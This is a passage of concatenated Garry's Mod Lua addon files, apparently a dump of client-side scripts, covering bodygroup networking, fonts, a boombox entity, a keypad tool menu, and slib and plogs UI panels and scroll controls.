local Tag = 'BodyGroupData'


FindMetaTable"Player".SetBodyGroupData = SERVER and function(self, n)
	n=n>2^32 and 2^32 or n<0 and 0 or n
	self:SetSaveValue("SetBodyGroup", n)
end or function(self, n)
	n=n>2^32 and 2^32 or n<0 and 0 or n
	if self ~= LocalPlayer() then return end
	self[Tag] = n
	net.Start(Tag)
		net.WriteUInt(n or 0, 32)
	net.SendToServer()
end

-- TODO
FindMetaTable"Player".GetBodyGroupData = function(self)
	return self[Tag]
end

--PATH addons/__main/lua/autorun/sh_mas_ninjaskunai_fonts.lua:
/*

 ██████╗██████╗ ███████╗ █████╗ ████████╗███████╗██████╗     ██████╗ ██╗   ██╗    ███╗   ███╗ █████╗ ██████╗  █████╗ ███╗   ██╗███████╗ ██████╗ 
██╔════╝██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██╔════╝██╔══██╗    ██╔══██╗╚██╗ ██╔╝    ████╗ ████║██╔══██╗██╔══██╗██╔══██╗████╗  ██║╚══███╔╝██╔═══██╗
██║     ██████╔╝█████╗  ███████║   ██║   █████╗  ██║  ██║    ██████╔╝ ╚████╔╝     ██╔████╔██║███████║██████╔╝███████║██╔██╗ ██║  ███╔╝ ██║   ██║
██║     ██╔══██╗██╔══╝  ██╔══██║   ██║   ██╔══╝  ██║  ██║    ██╔══██╗  ╚██╔╝      ██║╚██╔╝██║██╔══██║██╔══██╗██╔══██║██║╚██╗██║ ███╔╝  ██║   ██║
╚██████╗██║  ██║███████╗██║  ██║   ██║   ███████╗██████╔╝    ██████╔╝   ██║       ██║ ╚═╝ ██║██║  ██║██║  ██║██║  ██║██║ ╚████║███████╗╚██████╔╝
 ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═════╝     ╚═════╝    ╚═╝       ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝ 

------------------------------------------------------------------------------------------------------------------------------------------------------

██████╗  ██████╗     ███╗   ██╗ ██████╗ ████████╗    ██████╗ ███████╗██╗   ██╗██████╗ ██╗      ██████╗  █████╗ ██████╗                               
██╔══██╗██╔═══██╗    ████╗  ██║██╔═══██╗╚══██╔══╝    ██╔══██╗██╔════╝██║   ██║██╔══██╗██║     ██╔═══██╗██╔══██╗██╔══██╗                              
██║  ██║██║   ██║    ██╔██╗ ██║██║   ██║   ██║       ██████╔╝█████╗  ██║   ██║██████╔╝██║     ██║   ██║███████║██║  ██║                              
██║  ██║██║   ██║    ██║╚██╗██║██║   ██║   ██║       ██╔══██╗██╔══╝  ██║   ██║██╔═══╝ ██║     ██║   ██║██╔══██║██║  ██║                              
██████╔╝╚██████╔╝    ██║ ╚████║╚██████╔╝   ██║       ██║  ██║███████╗╚██████╔╝██║     ███████╗╚██████╔╝██║  ██║██████╔╝                              
╚═════╝  ╚═════╝     ╚═╝  ╚═══╝ ╚═════╝    ╚═╝       ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝     ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝                               

██╗███╗   ██╗     █████╗ ███╗   ██╗██╗   ██╗    ███████╗██╗  ██╗ █████╗ ██████╗ ███████╗     ██████╗ ██████╗     ███████╗ ██████╗ ██████╗ ███╗   ███╗
██║████╗  ██║    ██╔══██╗████╗  ██║╚██╗ ██╔╝    ██╔════╝██║  ██║██╔══██╗██╔══██╗██╔════╝    ██╔═══██╗██╔══██╗    ██╔════╝██╔═══██╗██╔══██╗████╗ ████║
██║██╔██╗ ██║    ███████║██╔██╗ ██║ ╚████╔╝     ███████╗███████║███████║██████╔╝█████╗      ██║   ██║██████╔╝    █████╗  ██║   ██║██████╔╝██╔████╔██║
██║██║╚██╗██║    ██╔══██║██║╚██╗██║  ╚██╔╝      ╚════██║██╔══██║██╔══██║██╔═══╝ ██╔══╝      ██║   ██║██╔══██╗    ██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║
██║██║ ╚████║    ██║  ██║██║ ╚████║   ██║       ███████║██║  ██║██║  ██║██║     ███████╗    ╚██████╔╝██║  ██║    ██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║
╚═╝╚═╝  ╚═══╝    ╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝       ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚══════╝     ╚═════╝ ╚═╝  ╚═╝    ╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝

-------------------------------------------------------- DO NOT REUPLOAD IN ANY SHAPE OR FORM -------------------------------------------------------- 
-------------------------------------------------------- DO NOT REUPLOAD IN ANY SHAPE OR FORM -------------------------------------------------------- 
-------------------------------------------------- IF YOU EDIT ANYTHING YOU ARE VOID OF MY SUPPORT --------------------------------------------------- 
-------------------------------------------------- IF YOU EDIT ANYTHING YOU ARE VOID OF MY SUPPORT --------------------------------------------------- 

*/
AddCSLuaFile()

if CLIENT then
	surface.CreateFont( "MaranzoAbil_UltimateFont", {
		font = "Arial",
		extended = false,
		size = 48,
		weight = 500,
		blursize = 0,
		scanlines = 0,
		antialias = true,
		shadow = false
	} )
	surface.CreateFont( "MaranzoAbil_DefaultFont", {
		font = "DermaDefaultBold",
		extended = false,
		size = 24,
		weight = 500,
		blursize = 0,
		scanlines = 0,
		antialias = true,
		shadow = false
	} )
end
--PATH addons/_boombox/lua/retroboombox/shared/sh_loadboombox.lua:
game.AddParticles( "particles/sterling/retro_vfx.pcf" )
PrecacheParticleSystem("music_notes_core")
PrecacheParticleSystem("music_notes_02")
PrecacheParticleSystem("music_stars")

hook.Add("PreGamemodeLoaded", "PreGamemodeLoaded.RetroBoombox", function()
	for sClass, tColors in pairs( RetroBoombox.Config.Boombox ) do

		local ENT = scripted_ents.Get( "retro_boombox_base" )
		
		ENT.PrintName = "Boombox : " .. sClass
		ENT.ClassName = sClass
		ENT.Spawnable = true
		ENT.Base = "retro_boombox_base"
		ENT.MainColor = tColors.MainColor
		ENT.MainLightsColor = tColors.MainLightsColor
		ENT.TubeLightsColor = tColors.TubeLightsColor
		ENT.SoundLightsColor = tColors.SoundLightsColor
		ENT.SecondaryColor = tColors.SecondaryColor
		ENT.ScreenBackgroundColor = tColors.ScreenBackgroundColor
		ENT.ScreenContentColor = tColors.ScreenContentColor

		scripted_ents.Register( ENT, sClass )
		
	end

end)

--PATH addons/__________skeypads/lua/skeypads/vgui/cl_toolmenu.lua:
local function buildFadingDoorOptions( panel )
    panel:NumSlider( 'Час роботи:', 'skeypads_output_time', sKeypads.Config.min_keypad_open_time, sKeypads.Config.max_keypad_open_time, 2 )
    panel:ControlHelp( 'Як довго кейпад повинен залишатися активованим.' )
    panel:Help( '' )
end

local function buildKeybindOptions( panel )
    local binders = vgui.Create( 'CtrlNumPad', CPanel )
    binders:SetConVar1( 'skeypads_key_success' )
    binders:SetConVar2( 'skeypads_key_fail' )
    binders:SetLabel1( 'Кнопка успіху' )
    binders:SetLabel2( 'Кнопка невдачі' )
    panel:AddPanel( binders )
    panel:Help( '' )
    panel:NumSlider( 'Час роботи:', 'skeypads_output_time', sKeypads.Config.min_keypad_open_time, sKeypads.Config.max_keypad_open_time, 2 )
    panel:ControlHelp( 'Як довго кейпад повинен залишатися активованим.' )
end

function sKeypads.BuildToolMenu( panel )
    local entry = panel:TextEntry( 'Пароль:', 'skeypads_password' )
    entry:SetNumeric( true )
    entry:SetMaximumCharCount( 4 )
    panel:ControlHelp( 'Максимум 4 цифри, пароль може складатися лише з цифр' )
    panel:Help( '' )
    panel:CheckBox( 'Увімкнути безпечний режим:', 'skeypads_securemode' )
    panel:ControlHelp( 'Приховать пароль під час введення.' )
    panel:Help( '' )
    local outputPanel = vgui.Create( 'ControlPanel' )
    local outputTypeCVar = GetConVar( 'skeypads_output_type' ) --Doesn't update through form dk why
    local typeCombo = panel:ComboBox( 'Тип виводу:', 'skeypads_output_type' )
    typeCombo:AddChoice( 'Fading Door', 'fadingdoor' )
    typeCombo:AddChoice( 'Прив\'язка клавіш', 'keybind' )
    function typeCombo:OnSelect( _, text, data )
        outputPanel:Clear()
        if data == 'fadingdoor' then
            buildFadingDoorOptions( outputPanel )
        elseif data == 'keybind' then
            buildKeybindOptions( outputPanel )
        end

        outputPanel:SetName( text )
        outputTypeCVar:SetString( data )
    end

    typeCombo:ChooseOptionID( 1 )
    typeCombo:SetTall( 30 )
    panel:AddItem( outputPanel )
end
--PATH addons/____slib/lua/slib/vgui/cl_sframe.lua:
local PANEL = {}

slib.setTheme("maincolor", Color(36,36,36))
slib.setTheme("accentcolor", Color(66,179,245))
slib.setTheme("margin", slib.getScaledSize(3, "x"))
slib.setTheme("textcolor", Color(255,255,255))
slib.setTheme("neutralcolor", Color(0,0,200,40))
slib.setTheme("topbarcolor", Color(44,44,44))
slib.setTheme("sidebarcolor", Color(34,34,34))
slib.setTheme("sidebarbttncolor", Color(39,39,39))
slib.setTheme("whitecolor", Color(255,255,255))
slib.setTheme("hovercolor", Color(255,255,255,100))
slib.setTheme("orangecolor", Color(130, 92, 10))
slib.setTheme("successcolor", Color(0,200,0))
slib.setTheme("failcolor", Color(200,0,0))
slib.setTheme("bgblur", true)

local topbarcolor, topbarcolor_min10, sidebarcolor, sidebarbttncolor, textcolor, accentcolor, maincolor, maincolor_7, maincolor_15, hovercolor = slib.getTheme("topbarcolor"), slib.getTheme("topbarcolor", -10), slib.getTheme("sidebarcolor"), slib.getTheme("sidebarbttncolor"), slib.getTheme("textcolor"), slib.getTheme("accentcolor"), slib.getTheme("maincolor"), slib.getTheme("maincolor", 7), slib.getTheme("maincolor", 15), slib.getTheme("hovercolor")
local accentcol_a100 = slib.getTheme("accentcolor")
accentcol_a100.a = 100

local black_a160 = Color(0,0,0,160)
local black_a140 = Color(0,0,0,140)

function PANEL:Init()
	self.topbarheight = slib.getScaledSize(30, "y")
	self.font = slib.createFont("Roboto", 21)
	self.tab = {}
	self.iterator = 0

	self.topbar = vgui.Create("EditablePanel", self)
	self.topbar:SetCursor("sizeall")
	self.topbar:SetSize(self:GetWide(), self.topbarheight)

	self.topbar.OnSizeChanged = function()
		if IsValid(self.close) then
			self.close:SetPos(self.topbar:GetWide() - self.close:GetWide() - slib.getScaledSize(3,"x"), 0)
		end
	end

	self.topbar.Paint = function(s, w, h)
		if !s.Holding and input.IsMouseDown(MOUSE_LEFT) then
				if s:IsHovered() then
					s.Move = true
				end

				s.Holding = true
				local x, y = gui.MouseX(), gui.MouseY()
				s.startedx, s.startedy = s:ScreenToLocal(x, y)
		elseif s.Holding and !input.IsMouseDown(MOUSE_LEFT) then
			s.Holding = nil
			s.Move = nil
		end

		if s.Move then
			local x, y = gui.MouseX(), gui.MouseY()
			local offsetx, offsety =  s:ScreenToLocal(x, y)
			
			self:SetPos(x - s.startedx, y - s.startedy)
		end

		draw.RoundedBoxEx(5, 0, 0, w, h, topbarcolor, true, true)

		surface.SetDrawColor(black_a160)
		surface.DrawRect(0, h - 1, w, 1)

		surface.SetDrawColor(black_a140)
		surface.DrawRect(0, h - 2, w, 1)
		draw.SimpleText(self.title, self.font, slib.getScaledSize(3,"x"), h * .5, textcolor, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
	end

	self.frame = vgui.Create("EditablePanel", self)

	self.frame.Resize = function()
		local wide = 0

		if self.tabmenu then
			wide = wide + self.tabmenu:GetWide()
		end

		self.frame:SetPos(wide,self.topbarheight)
		self.frame:SetSize(self:GetWide() - wide, self:GetTall() - self.topbarheight)
		
		for k,v in pairs(self.tab) do
			self.tab[k]:SetSize(self.frame:GetWide(), self.frame:GetTall())
		end
	end

	self.frame.Resize()

	self.MadePanel = SysTime()

	slib.wrapFunction(self, "SetSize", nil, function() return self end, true)
	slib.wrapFunction(self, "SetWide", nil, function() return self end, true)
	slib.wrapFunction(self, "Center", nil, function() return self end, true)
	slib.wrapFunction(self, "SetPos", nil, function() return self end, true)
	slib.wrapFunction(self, "MakePopup", nil, function() return self end, true)
	slib.wrapFunction(self, "DockPadding", nil, function() return self end, true)
end

function PANEL:OnRemove()
	if !IsValid(self.bgclose) then return end
	self.bgclose:Remove()
end

function PANEL:SetBG(bool, close, col, makepopup)
	if !bool and IsValid(self.bgclose) then
		self:SetParent()
		self.bgclose:Remove()
		
		return
	end

	local parent = self:GetParent()

	local w, h

	if IsValid(parent) then
		w, h = parent:GetSize() 
	else
		w, h = ScrW(), ScrH()
	end

	self.bgclose = vgui.Create("SButton", parent)
	self.bgclose:SetSize(w, h)

	if makepopup then
		self.bgclose:MakePopup()
	else
		self.bgclose:MoveToFront()
	end

	self.bgclose.DoClick = function()
		if !close then return end

		if IsValid(self.bgclose) then
			self.bgclose:Remove()
		end

		if IsValid(self) then
			self:Remove()
		end
	end

	self.bgclose.bg = col

	self.bgclose.Paint = function(s,w,h)
		if !IsValid(self) then s:Remove() end
		
		if !s.bg then return end
		surface.SetDrawColor(s.bg)
		surface.DrawRect(0,0,w,h)
	end

	self:SetParent(self.bgclose)
	self:MoveToFront()
	
	return self
end

function PANEL:SetDraggable(bool)
	if IsValid(self.topbar) then
		self.topbar:SetMouseInputEnabled(bool)
	end

	return self
end

function PANEL:setTitle(str, font)
	self.title = str

	if font then
		self.font = font
	end
	
	return self
end

function PANEL:addCloseButton()
	self.close = vgui.Create("DButton", self)
	self.close:SetSize(slib.getScaledSize(25, "y"),slib.getScaledSize(25, "y"))
	self.close:SetMouseInputEnabled(true)
	self.close:SetPos(self.topbar:GetWide() - self.close:GetWide() - slib.getScaledSize(3,"x"), self.topbarheight * .5 - self.close:GetTall() * .5)
	self.close:SetText("")

	self.close.DoClick = function()
		if isfunction(self.onClose) then
			self.onClose()
		end
		
		if self.onlyHide then
			self:SetVisible(false)
		return end

		self:Remove()
	end

	self.close.Paint = function(s,w,h)
		local width = slib.getScaledSize(2, "X")
		local height = h * .7

		draw.NoTexture()

		local wantedCol = s:IsHovered() and color_white or hovercolor

        surface.SetDrawColor(slib.lerpColor(s, wantedCol))
		surface.DrawTexturedRectRotated(w - (height * .5), h * .5 - (width * .5), width, height, 45)
		surface.DrawTexturedRectRotated(w - (height * .5), h * .5 - (width * .5), width, height, -45)
	end

	return self
end

function PANEL:OnSizeChanged()
	self.topbar:SetSize(self:GetWide(), self.topbarheight)
	self.frame.Resize()
end

function PANEL:setBlur(bool)
	self.blur = bool

	return self
end

function PANEL:setDoClick(func)
	self.DoClick = func

	return self
end

function PANEL:Paint(w, h)
	if slib.getTheme("bgblur") and self.blur then
		Derma_DrawBackgroundBlur( self, self.MadePanel )
	end
	
	draw.RoundedBox(5, 0, 0, w, h, maincolor)
end

function PANEL:addTab(name, icon)
	if !IsValid(self.tabmenu) then
		self.tabmenu = vgui.Create("DScrollPanel", self)
		self.tabmenu:SetTall(self:GetTall() - self.topbarheight)
		self.tabmenu:SetPos(0, self.topbarheight)
		self.tabmenu.font = slib.createFont("Roboto", 14)
		self.tabmenu.Paint = function(s,w,h)
			draw.RoundedBoxEx(5, 0, 0, w, h, sidebarcolor, false, false, true, false)
		end

		self.tabmenu.OnSizeChanged = function()
			self.frame.Resize()
		end

		self.frame.Resize()
	end

	self.tab[name] = vgui.Create("EditablePanel", self.frame)
	self.tab[name]:SetSize(self.frame:GetWide(), self.frame:GetTall())
	self.tab[name]:SetVisible(false)
	self.tab[name].addTab = function(tab_name)
		local w, h, tab_h = self.tab[name]:GetWide(), self.tab[name]:GetTall(), slib.getScaledSize(32, "y")
		if !IsValid(self.tab[name].topbar) then
			self.tab[name].topbar = vgui.Create("EditablePanel", self.tab[name])
			self.tab[name].topbar:Dock(TOP)
			self.tab[name].topbar:SetTall(tab_h)
			self.tab[name].topbar.Paint = function(s,w,h)
				surface.SetDrawColor(maincolor_7)
				surface.DrawRect(0,0,w,h)
			end
		end

		local frame = vgui.Create("EditablePanel", self.tab[name])
		frame:SetPos(0, tab_h)
		frame:SetSize(w, h - tab_h)
		frame:SetVisible(false)

		local tab_button = vgui.Create("SButton", self.tab[name].topbar)
		tab_button.font = slib.createFont("Roboto", 16)
		tab_button.bg = maincolor_7
		tab_button.tab = frame

		tab_button.DoClick = function()
			if IsValid(self.tab[name].selTab) and self.tab[name].selTab:IsVisible() then
				self.tab[name].selTab.tabbttn.forcehover = nil
				self.tab[name].selTab.tabbttn.bg = maincolor_7
				self.tab[name].selTab:SetVisible(false)
			end

			frame:SetVisible(true)
			self.tab[name].selTab = frame

			tab_button.bg = maincolor_15
			tab_button.forcehover = true
		end

		frame.tabbttn = tab_button

		tab_button:setTitle(tab_name)
		:Dock(LEFT)

		local childs = self.tab[name].topbar:GetChildren()
		local width = math.ceil(self.frame:GetWide() / #childs)
		for k,v in ipairs(childs) do
			v:SetWide(width)
		end

		if #childs == 1 then
			tab_button.DoClick()
		end

		return frame
	end

	local height = slib.getScaledSize(28, "y")
	self.iterator = self.iterator + 1
	local tabbttn = vgui.Create("DButton", self.tabmenu)
	tabbttn:Dock(TOP)
	tabbttn:SetZPos(self.iterator)
	tabbttn:SetTall(height)
	tabbttn:SetText("")
	tabbttn.name = name

	tabbttn.getFrame = function()
		return self.tab[name]
	end

	if icon then
		tabbttn.icon = Material(icon, "smooth")
	end

	local icosize = height * .6
	local gap = height * .20

	tabbttn.Paint = function(s,w,h)
		surface.SetDrawColor(sidebarbttncolor)
		surface.DrawRect(0, 0, w, h)

		local wantedh = self.seltab == name and h or 0
		local curH = slib.lerpNum(s, wantedh, .9, true)

		if self.seltab == name then
			surface.SetDrawColor(accentcol_a100)
			surface.DrawRect(0, h * .5 - curH * .5, w, curH)
		end

		if s.icon then
			surface.SetDrawColor(color_white)
			surface.SetMaterial(s.icon)
			surface.DrawTexturedRect(gap,gap,icosize,icosize)
		end

		draw.SimpleText(name, self.tabmenu.font, (s.icon and icosize + gap or 0) + slib.getTheme("margin"), h * .5, textcolor, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
	end

	tabbttn.DoClick = function()
		self:setActiveTab(name)

		if isfunction(self.changedTab) then
			self.changedTab(name)
		end
	end

	self.tab[name].tabbttn = tabbttn
	
	surface.SetFont(self.tabmenu.font)
	local w = select(1, surface.GetTextSize(name)) + (slib.getTheme("margin") * 4) + height

	if w > self.tabmenu:GetWide() then
		self.tabmenu:SetWide(w)
	end

	return self, tabbttn
end

function PANEL:setActiveTab(name)
	if !name then
		local childs = self.tabmenu:GetCanvas():GetChildren()
		local lowest, selected = math.huge
		for k,v in ipairs(childs) do
			local zpos = v:GetZPos()
			if zpos < lowest then
				selected = v.name
				lowest = zpos
			end

		end

		if selected then
			self:setActiveTab(selected)
		end

		return
	end

	if self.seltab and IsValid(self.tab[self.seltab]) then
		self.tab[self.seltab]:SetVisible(false)
	end

	self.seltab = name

	self.tab[name]:SetVisible(true)

	return self
end

vgui.Register("SFrame", PANEL, "EditablePanel")
--PATH addons/____slib/lua/slib/vgui/cl_stextentry.lua:
local PANEL = {}

local accentcolor, textcolor, textcolor_30, textcolor_80 = slib.getTheme("accentcolor"), slib.getTheme("textcolor"), slib.getTheme("textcolor", -30), slib.getTheme("textcolor", -80)

function PANEL:Init()
    slib.wrapFunction(self, "Dock", nil, function() return self end, true)
    slib.wrapFunction(self, "SetNumeric", nil, function() return self end, true)
    slib.wrapFunction(self, "DockMargin", nil, function() return self end, true)
    slib.wrapFunction(self, "SetTextColor", nil, function() return self end, true)
    slib.wrapFunction(self, "SetDrawLanguageID", nil, function() return self end, true)
    slib.wrapFunction(self, "SetFont", nil, function() return self end, true)
    slib.wrapFunction(self, "SetTall", nil, function() return self end, true)
    slib.wrapFunction(self, "SetValue", nil, function() return self end, true)

    self.font = slib.createFont("Roboto", 15)
    self.placeholder = "Search..."

    self:SetDrawLanguageID(false)
    :SetTall(slib.getScaledSize(25, "y"))
    :SetFont(self.font)
    :SetTextColor(textcolor_80)
    :SetValue(self.placeholder)
end

function PANEL:Paint(w,h)
    local val = self:GetValue()
    local wantedcolor = accentcolor
    wantedcolor.a = self:HasFocus() and 120 or 20

    if self.bg then
        surface.SetDrawColor(self.bg)
        surface.DrawRect(0, 0, w, h)
    end
    
    if !self.sideline then
        surface.SetDrawColor(slib.lerpColor(self, wantedcolor))
        surface.DrawRect(0, !self.accentlinetop and h - 1 or 0, w, 1)
    end

    self:DrawTextEntryText(val == self.placeholder and textcolor_30 or textcolor, accentcolor, textcolor)
end

function PANEL:OnGetFocus()
    local val = self:GetValue()
    if val == self.placeholder then
        self:SetValue("")
    end
end

function PANEL:AccentLineTop(bool)
    self.accentlinetop = bool
end

function PANEL:SetRefreshRate(rate)
    self.refreshrate = rate
end

function PANEL:AccentSideLine(bool)
    self.sideline = bool
end

function PANEL:OnTextChanged()
    local newvalue = self:GetValue()

    timer.Create(tostring(self), self.refreshrate or .3, 1, function()
        if !IsValid(self) then return end
        if isfunction(self.onValueChange) then
            self.onValueChange(newvalue)
        end
    end)
end

function PANEL:SetPlaceholder(str)
    self.placeholder = str
    self:SetValue(self.placeholder)

    return self
end

function PANEL:OnLoseFocus()
    timer.Simple(.1, function()
        if !IsValid(self) then return end
        local val = self:GetValue()
        if !val or val == "" then
            self:SetValue(self.placeholder)
        end
    end)
end

vgui.Register("STextEntry", PANEL, "DTextEntry")
--PATH addons/____sprinter/lua/s_printer/sh_sprinter_interface.lua:
sPrinter = sPrinter or {}
sPrinter.config = sPrinter.config or {}

// _                           ___                   
// | |       _                 / __)                  
// | |____ _| |_ _____  ____ _| |__ _____  ____ _____ 
// | |  _ (_   _) ___ |/ ___|_   __|____ |/ ___) ___ |
// | | | | || |_| ____| |     | |  / ___ ( (___| ____|
// |_|_| |_| \__)_____)_|     |_|  \_____|\____)_____)
//
// This is used if you want to override the currency, for example PS1 points etc.

sPrinter.config.addMoney = function(ply, money)
    return ply:addMoney(money)
end

sPrinter.config.canAfford = function(ply, money)
    return ply:canAfford(money)
end
--PATH addons/____plogs/lua/ui/colors.lua:

-----------------------------------------------------
local c = Color

ui.col = {
	SUP 			= c(70,70,70),
	Background 		= c(41,41,41,175),
	Outline 		= c(171,171,171),
	Hover 			= c(0,0,0,0),


	Button 			= c(31,31,31,175),
	ButtonHover 	= c(70,70,70),
	ButtonRed 		= c(70,70,70),
	ButtonGreen 	= c(0,240,0),
	Close 			= c(255,255,255),
	CloseBackground = c(0,0,0,0),
	CloseHovered 	= c(70,70,70),


	OffWhite 		= c(0,0,0,170),
	FlatBlack 		= c(0,0,0,170),
	Black 			= c(0,0,0,170),
	White 			= c(255,255,255),
	Red 			= c(255,0,0),
	Orange 			= c(245,120,0),
}

include 'theme.lua' 
--PATH addons/____plogs/lua/ui/controls/scrollpanel.lua:

-----------------------------------------------------
local SCROLLBAR = {}
function SCROLLBAR:Init()
	self.parent = self:GetParent()

	self.scrollButton = vgui.Create('Panel', self)
	self.scrollButton.OnMousePressed = function(s, mb)
		if (mb == MOUSE_LEFT and !self:GetParent().ShouldHideScrollbar) then
			local mx, my = s:CursorPos()

			s.scrolling = true
			s.mouseOffset = my
		end
	end
	self.scrollButton.OnMouseReleased = function(s, mb)
		if (mb == MOUSE_LEFT) then
			s.scrolling = false
			s.mouseOffset = nil
		end
	end

	self.height = 0
	self.addWidth = 0
end

function SCROLLBAR:Think()
	if (self.scrollButton.scrolling) then
		if (!input.IsMouseDown(MOUSE_LEFT)) then
			self.scrollButton:OnMouseReleased(MOUSE_LEFT)
			return
		end

		local mx, my = self.scrollButton:CursorPos()

		local diff = my - self.scrollButton.mouseOffset

		local maxOffset = self.parent:GetCanvas():GetTall() - self.parent:GetTall()

		local perc = (self.scrollButton.y + diff) / (self:GetTall() - self.height)
		self.parent.yOffset = math.Clamp(perc * maxOffset, 0, maxOffset)

		self.parent:InvalidateLayout()
	end

	local preSize = self.addWidth

	local mx, my = self:CursorPos()
	if ((mx > -8 and mx < self:GetWide() + 3 and my > self.scrollButton.y and my < self.scrollButton.y + self.height) or self.scrollButton.scrolling) then
		self.addWidth = math.Clamp(self.addWidth + (FrameTime() * 96), 0, 8)
	else
		self.addWidth = math.Clamp(self.addWidth - (FrameTime() * 96), 0, 8)
	end

	if (preSize != self.addWidth) then
		self:InvalidateLayout()
	end
end

function SCROLLBAR:PerformLayout()
	local maxOffset = self.parent:GetCanvas():GetTall() - self.parent:GetTall()

	self:SetSize(2 + self.addWidth, self.parent:GetTall())
	self:SetPos(self.parent:GetWide() - self:GetWide(), 0)

	self.heightRatio = self.parent:GetTall() / self.parent:GetCanvas():GetTall()
	self.height = math.Clamp(math.ceil(self.heightRatio * self.parent:GetTall()), 20, math.huge)

	self.scrollButton:SetSize(self:GetWide(), self.height)
	self.scrollButton:SetPos(0, math.Clamp((self.parent.yOffset / maxOffset), 0, 1) * (self:GetTall() - self.height))
end

function SCROLLBAR:Paint(w, h)
	if (self:GetParent().ShouldHideScrollbar) then return end
	
	derma.SkinHook('Paint', 'UIScrollBar', self, w, h)
end

function SCROLLBAR:OnMouseWheeled(delta)
	self.parent:OnMouseWheeled(delta)
end

vgui.Register('ui_scrollbar', SCROLLBAR, 'Panel')


local SCROLLABLE = {}
function SCROLLABLE:Init()
	self.contentContainer = vgui.Create('Panel', self)
	self.scrollBar = vgui.Create('ui_scrollbar', self)

	self.yOffset = 0
	self.ySpeed = 0
	self.scrollSize = 4
	self.SpaceTop = 0
	self.Padding = 0
	
	function self.contentContainer:OnChildRemoved(child)		
		self:GetParent():PerformLayout()
	end
end

function SCROLLABLE:Reset()
	self:GetCanvas():Clear(true)
	self.yOffset = 0
	self.ySpeed = 0
	self.scrollSize = 1

	self:PerformLayout()
end

function SCROLLABLE:AddItem(child)
	child:SetParent(self:GetCanvas())
	self:PerformLayout()
end

function SCROLLABLE:SetSpacing(i)
	self.SpaceTop = i
end

function SCROLLABLE:SetPadding(i)
	self.Padding = i
end

function SCROLLABLE:GetCanvas()
	return self.contentContainer
end

function SCROLLABLE:SetScrollSize(int)
	self.scrollSize = int
end

function SCROLLABLE:ScrollTo(y)
	self.yOffset = y

	self:InvalidateLayout()
end

function SCROLLABLE:OnMouseWheeled(delta)
	if ((delta > 0 and self.ySpeed < 0) or (delta < 0 and self.ySpeed > 0)) then
		self.ySpeed = 0
	else
		self.ySpeed = self.ySpeed + (delta * self.scrollSize)
	end

	self:PerformLayout()
end

function SCROLLABLE:SetOffset(offSet)
	local maxOffset = (self:GetCanvas():GetTall() - self:GetTall())
	if (maxOffset < 0) then maxOffset = 0 end

	self.yOffset = math.Clamp(offSet, 0, maxOffset)

	self:PerformLayout()

	if (self.yOffset == 0 or self.yOffset == maxOffset) then return true end
end

function SCROLLABLE:Think()
	if (self.ySpeed != 0) then
		if (self:SetOffset(self.yOffset - self.ySpeed)) then
			self.ySpeed = 0
		else
			if (self.ySpeed < 0) then
				self.ySpeed = math.Clamp(self.ySpeed + (FrameTime() * self.scrollSize * 4), self.ySpeed, 0)
			else
				self.ySpeed = math.Clamp(self.ySpeed - (FrameTime() * self.scrollSize * 4), 0, self.ySpeed)
			end
		end
	end
end

function SCROLLABLE:PerformLayout()
	local canvas = self:GetCanvas()

	if (canvas:GetWide() != self:GetWide()) then
		canvas:SetWide(self:GetWide())
	end

	local y = 0
	local lastChild
	for k, v in ipairs(canvas:GetChildren()) do
		local childY = y + self.SpaceTop
		if (v.x != self.Padding or v.y != childY) then
			v:SetPos(math.max(0, self.Padding), y + self.SpaceTop)
		end
		if (v:GetWide() != self:GetWide() - self.Padding * 2) then
			v:SetWide(math.min(self:GetWide(), self:GetWide() - self.Padding * 2))
		end

		y = v.y + v:GetTall() + self.SpaceTop + self.Padding
		lastChild = v
	end
	y = lastChild and lastChild.y + lastChild:GetTall() or y
	if (canvas:GetTall() != y) then
		canvas:SetTall(y)
	end

	if (canvas:GetTall() <= self:GetTall() and self.scrollBar:IsVisible()) then
		canvas:SetTall(self:GetTall())

		self.scrollBar:SetVisible(false)
	elseif (canvas:GetTall() > self:GetTall() and !self.scrollBar:IsVisible()) then
		self.scrollBar:SetVisible(true)
	end

	local maxOffset = (self:GetCanvas():GetTall() - self:GetTall())

	if (self.yOffset > maxOffset) then
		self.yOffset = maxOffset
	end

	if (self.yOffset < 0) then
		self.yOffset = 0
	end
	
	if (canvas.x != 0 or canvas.y != -self.yOffset) then
		canvas:SetPos(0, -self.yOffset)
		self.scrollBar:InvalidateLayout()
	end
end

function SCROLLABLE:IsAtMaxOffset()
	local maxOffset = math.Clamp(self:GetCanvas():GetTall() - self:GetTall(), 0, math.huge)
	return self.yOffset == maxOffset
end

function SCROLLABLE:Paint(w, h)
end

function SCROLLABLE:HideScrollbar(bool)
	self.ShouldHideScrollbar = bool
end

function SCROLLABLE:DockToFrame()
	local p = self:GetParent()
	local x, y = p:GetDockPos()
	self:SetPos(x, y)
	self:SetSize(p:GetWide() - 10, p:GetTall() - (y + 5))
end

vgui.Register('ui_scrollpanel', SCROLLABLE, 'Panel')
--PATH addons/____plogs/lua/ui/controls/slider.lua:

-----------------------------------------------------
local PANEL = {}

function PANEL:Init()
	self.Button = ui.Create('DButton', self)
	self.Button.OnMousePressed = function(s, mb) if (mb == MOUSE_LEFT) then s:GetParent():StartDrag() end end
	self.Button:SetText('')
	self:SetValue(0.5)
end

function PANEL:PerformLayout()
	self:SetTall(16)
	self.Button:SetSize(16, 16)
	self.Button:SetPos(self.Value * (self:GetWide() - 16), 0)
end

function PANEL:Paint(w, h)
	derma.SkinHook('Paint', 'UISlider', self, w, h)
end

function PANEL:Think()
	if (self.Dragging) then
		local mx, my = self:CursorPos()
		mx = math.Clamp(mx - self.OffX, 0, self:GetWide() - 16)

		if (self.Button.x != mx) then
			self:SetValue(mx / (self:GetWide() - 16))
			self:OnChange(self.Value)
		end

